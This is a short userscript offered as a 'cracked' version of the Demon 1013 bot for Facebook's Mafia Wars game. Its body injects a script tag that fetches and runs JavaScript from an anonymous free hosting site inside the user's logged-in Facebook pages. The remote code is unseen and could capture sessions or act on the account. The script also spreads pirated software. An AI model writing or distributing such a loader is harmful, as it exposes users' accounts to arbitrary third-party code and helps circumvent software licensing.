// ==UserScript== 
// @name        test demon 
// @namespace   test demon
// @description Cracked Functional Version Of Demon 1013(Stable) 
// @include http://apps.facebook.com/inthemafia/*
// @include https://apps.facebook.com/inthemafia/*
// @include http://facebook.mafiawars*/mwfb/remote/html_server.php*
// @include https://facebook.mafiawars*/mwfb/remote/html_server.php*
// @include http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include http://mwscripts.com/happyplace*
// @include https://mwscripts.com/happyplace*
// @icon        http://sphotos-h.ak.fbcdn.net/hphotos-ak-ash4/p206x206/399666_1792940600098_680803512_n.jpg
// @version     1.0.1.3
// ==/UserScript== 
{
// c0de injected by the none
function inject(func)
{
var source = func.toString();
var script = document.createElement('script');
// Version 1013 Cracked & Stable
script.innerHTML = '('+source+')()';
document.body.appendChild(script);
}
function loader()
{
var a = document.createElement('script');
a.type = 'text/javascript';
a.src = 'http://yourjavascript.com/32133282102/1013.js';
document.getElementsByTagName('head')[0].appendChild(a);
}
var skip = false;
if (/xw_controller=freegifts/.test(document.location.href))
skip = true;
if (/xw_controller=requests/.test(document.location.href))
skip = true;
if (!skip)
inject(loader);
}